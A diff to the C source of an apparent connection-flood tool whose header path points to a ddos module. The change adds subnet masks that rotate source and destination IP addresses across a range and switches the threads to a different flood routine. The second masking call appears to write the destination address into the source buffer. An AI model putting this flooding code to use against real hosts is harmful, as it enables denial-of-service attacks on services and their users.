@@ -3,6 +3,7 @@
 #include "../base/make_tcp.h"
 #include "../base/receiver.h"
 #include "../ddos/conn_flood.h"
+#include "../base/subnet_mask.h"
 
 unsigned int conn_total;
 unsigned int conn_produced;
@@ -12,11 +13,16 @@ unsigned int conn_per_second;
 unsigned int conn_duration;
 double conn_elapsed_time;
 
-
 char *conn_dest_ip;
 char *conn_src_ip;
 int conn_src_port;
 int conn_dest_port;
+
+int conn_src_ip_mask;
+int conn_dest_ip_mask;
+
+char conn_now_src_ip[16];
+char conn_now_dest_ip[16];
 
 int conn_generated_count;
 short conn_timed_finisher;
@@ -113,8 +119,12 @@ void* generate_conn_flooding2(void *data) {
 			pthread_cond_wait(&conn_cond, &conn_mutex);
 		}
 
-		int sock =  tcp_make_connection(inet_addr(conn_src_ip), inet_addr(conn_dest_ip),
+		int sock =  tcp_make_connection(inet_addr(conn_now_src_ip), inet_addr(conn_now_dest_ip),
 				conn_src_port, conn_dest_port, SOCK_STREAM);
+
+		masking_next_ip_addr(conn_src_ip, conn_now_src_ip, conn_src_ip_mask);
+			masking_next_ip_addr(conn_dest_ip, conn_now_src_ip, conn_dest_ip_mask);
+
 		conn_src_port++;
 		conn_generated_count++;
 		conn_produced++;
@@ -438,7 +448,7 @@ void conn_flood_run(char *argv[], int mode) {
 		if (mode == 2)
 		{
 			printf("thread %d created\n",i);
-			pthread_create(&generate_thread[i], NULL, generate_conn_flooding4,
+			pthread_create(&generate_thread[i], NULL, generate_conn_flooding2,
 								(void*) &generate_thread_id[i]);
 			/*RECEIVE THREAD DEACTIVATION*/
 			//pthread_create(&receive_thread[i],NULL,receive_conn,(void*)&receive_thread_id[i]);
